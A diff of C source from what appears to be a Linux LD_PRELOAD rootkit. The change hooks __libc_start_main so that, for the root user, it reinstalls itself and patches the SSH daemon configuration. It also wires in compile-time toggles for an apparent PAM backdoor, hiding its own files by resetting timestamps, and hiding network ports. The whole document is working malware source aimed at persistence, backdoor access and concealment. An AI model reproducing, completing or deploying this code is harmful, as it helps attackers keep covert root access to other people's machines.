@@ -2,6 +2,13 @@
 
 #include "toggles.h"
 
+#if !defined(USE_PAM_BD) && defined(PATCH_SSHD_CONFIG)
+#error "USE_PAM_BD is not defined while PATCH_SSHD_CONFIG is."
+#endif
+#if defined(USE_PAM_BD) && !defined(PATCH_SSHD_CONFIG)
+#warning "USE_PAM_BD is enabled without PATCH_SSHD_CONFIG."
+#endif
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -19,6 +26,11 @@
 #include <sys/wait.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+
+#ifdef HIDE_SELF
+#include <utime.h>
+#include <sys/time.h>
+#endif
 
 #ifdef HIDE_PORTS
 #include <linux/netlink.h>
@@ -43,10 +55,16 @@
 #include "includes.h"
 
 int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
+    if(not_user(0))
+        goto do_libc_start_main;
+
 #ifdef DO_REINSTALL
-    if(not_user(0)) goto do_libc_start_main;
     reinstall();
 #endif
+#ifdef PATCH_SSHD_CONFIG
+    sshdpatch(REG_USR);
+#endif
+
 do_libc_start_main:
     hook(C__LIBC_START_MAIN);
     return (long)call(C__LIBC_START_MAIN, main, argc, ubp_av, init, fini, rtld_fini, stack_end);
